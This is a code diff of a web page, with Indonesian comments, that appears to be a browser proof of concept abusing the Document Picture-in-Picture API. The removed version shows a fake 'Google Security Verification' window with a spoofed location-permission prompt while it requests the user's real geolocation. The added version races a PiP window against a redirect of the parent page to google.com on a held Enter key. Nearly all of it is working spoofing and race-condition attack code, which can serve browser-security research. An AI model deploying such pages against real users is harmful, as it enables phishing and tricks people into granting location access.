@@ -3,187 +3,91 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Security Verification</title>
+<title>PiP + Redirect Race Upgrade</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
-  h2 { color: #4285f4; margin-bottom: 10px; }
+  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+  h1 { color: #4285f4; margin-bottom: 20px; }
   p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
-  button:hover { background: #1557b0; }
-  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
+  #status { font-family: monospace; font-size: 12px; color: #999; margin-top: 20px; }
 </style>
 </head>
 <body>
 
-<div class="panel" id="main-card">
-  <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengizinkan lokasi.</p>
-  <button id="startBtn">Verify Account & Allow Location</button>
-  <div id="status">[*] Ready...</div>
-</div>
+<h1>Hold Enter</h1>
+<p>Press and hold Enter to trigger PiP + Redirect race.</p>
+<div id="status">[*] Ready...</div>
 
 <script>
 (function () {
   'use strict';
 
-  var btn = document.getElementById('startBtn');
   var statusEl = document.getElementById('status');
+  var counter = 0;
+  var maxAttempts = 10;
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP + Location Race] " + msg);
+    console.log("[PiP Race] " + msg);
   }
 
   // ============================================
-  // 1. TRIGGER (KLIK) - RACE CONDITION
+  // 1. FUNGSI UTAMA: PiP + REDIRECT RACE
   // ============================================
-  btn.addEventListener('click', async function() {
-    log("[*] Memulai PiP + location race...");
-
-    try {
-      if (!window.documentPictureInPicture) {
-        alert("Document Picture-in-Picture tidak didukung.");
-        return;
-      }
-
-      // ============================================
-      // 2. BUKA PiP & MINTA IZIN LOKASI BERSAMAAN (0ms)
-      // ============================================
-      
-      // A. Buka PiP (async)
-      const pipPromise = (async () => {
-        try {
-          const pipWindow = await documentPictureInPicture.requestWindow({
-            width: 500,
-            height: 400
-          });
-
-          // Tulis konten PiP (UI palsu)
-          pipWindow.document.open();
-          pipWindow.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head>
-              <meta charset="UTF-8">
-              <title>Google Security Verification</title>
-              <style>
-                * { margin: 0; padding: 0; box-sizing: border-box; }
-                body {
-                  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                  background: #fff;
-                  display: flex;
-                  flex-direction: column;
-                  justify-content: center;
-                  align-items: center;
-                  min-height: 100vh;
-                  padding: 20px;
-                  text-align: center;
-                }
-                .g-logo {
-                  font-size: 48px;
-                  font-weight: bold;
-                  color: #4285f4;
-                  margin-bottom: 20px;
-                }
-                h3 { font-size: 24px; color: #333; margin-bottom: 10px; }
-                p { font-size: 14px; color: #666; margin-bottom: 20px; }
-                .fake-prompt {
-                  background: #fff;
-                  border: 1px solid #ddd;
-                  border-radius: 12px;
-                  padding: 25px;
-                  box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-                  text-align: center;
-                  max-width: 350px;
-                  width: 100%;
-                }
-                .fake-prompt h4 { font-size: 18px; color: #333; margin-bottom: 10px; }
-                .fake-prompt p { font-size: 13px; color: #666; margin-bottom: 20px; }
-                .fake-prompt button {
-                  padding: 12px 24px;
-                  margin: 5px;
-                  border: none;
-                  border-radius: 6px;
-                  font-size: 14px;
-                  font-weight: bold;
-                  cursor: pointer;
-                }
-                .fake-prompt .allow { background: #1a73e8; color: #fff; }
-                .fake-prompt .block { background: #f0f0f0; color: #333; }
-                .footer {
-                  margin-top: 20px;
-                  font-size: 11px;
-                  color: #999;
-                }
-              </style>
-            </head>
-            <body>
-              <div class="g-logo">G</div>
-              <h3>Google Security Verification</h3>
-              <p>Please allow location access to continue.</p>
-
-              <div class="fake-prompt">
-                <h4>accounts.google.com ingin menggunakan lokasi Anda</h4>
-                <p>This is a simulated permission prompt.</p>
-                <button class="block" id="fakeBlock">Blokir</button>
-                <button class="allow" id="fakeAllow">Izinkan</button>
-              </div>
-
-              <div class="footer">This is a simulated phishing test. Do not enter real credentials.</div>
-
-              <script>
-                (function() {
-                  document.getElementById('fakeAllow').addEventListener('click', function() {
-                    window.location.href = 'https://www.google.com';
-                  });
-
-                  document.getElementById('fakeBlock').addEventListener('click', function() {
-                    window.close();
-                  });
-                })();
-              <\/script>
-            </body>
-            </html>
-          `);
-          pipWindow.document.close();
-
-          return pipWindow;
-        } catch (e) {
-          log("PiP Error: " + e.message);
-          return null;
-        }
-      })();
-
-      // B. Minta izin lokasi (LANGSUNG, 0ms)
-      try {
-        log("[*] Meminta Izin Lokasi...");
-        
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
-            log("[+] Lokasi DIIZINKAN!");
-            log("Lat: " + position.coords.latitude + ", Lon: " + position.coords.longitude);
-          },
-          function(error) {
-            log("[-] Lokasi ditolak: " + error.message);
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      } catch (e) {
-        log("[-] Geolocation error: " + e.message);
-      }
-
-      // C. Tunggu PiP siap
-      const pipWindow = await pipPromise;
-      if (pipWindow) {
-        log('PiP Window Opened. Location prompt triggered simultaneously.');
-      }
-
-    } catch (e) {
-      log('Error: ' + e.message);
+  async function triggerRace() {
+    if (counter >= maxAttempts) {
+      log("[!] Max attempts reached: " + counter);
+      return;
     }
-  }, { once: true });
+    counter++;
+    log("[*] Attempt #" + counter);
+
+    // ============================================
+    // A. BUKA PiP (ASYNC) DAN REDIRECT (LANGSUNG)
+    // ============================================
+    
+    // 1. Buka PiP
+    const pipPromise = documentPictureInPicture.requestWindow({
+      width: 600,
+      height: 400
+    }).then(pipWindow => {
+      // Navigasi PiP ke example.com
+      pipWindow.location.href = 'https://example.com';
+      return pipWindow;
+    }).catch(err => {
+      log("PiP Error: " + err.message);
+      return null;
+    });
+
+    // 2. REDIRECT PARENT (LANGSUNG, 0ms)
+    setTimeout(() => {
+      log("[*] Redirecting parent to google.com/x...");
+      window.location.href = 'https://google.com/x';
+    }, 100); // 100ms delay (sesuai kode asli, bisa diubah)
+
+    // 3. Tunggu PiP siap (tidak blocking)
+    pipPromise.then(pipWindow => {
+      if (pipWindow) {
+        log("[+] PiP opened and navigated to example.com");
+      }
+    });
+  }
+
+  // ============================================
+  // 2. KEYPRESS LISTENER (HOLD ENTER)
+  // ============================================
+  document.body.onkeypress = function(e) {
+    if (e.key === 'Enter') {
+      triggerRace();
+    }
+  };
+
+  // ============================================
+  // 3. TOMBOL UNTUK MEMUDAHKAN (OPSIONAL)
+  // ============================================
+  document.body.addEventListener('click', function() {
+    triggerRace();
+  }, { once: false });
 
 })();
 </script>
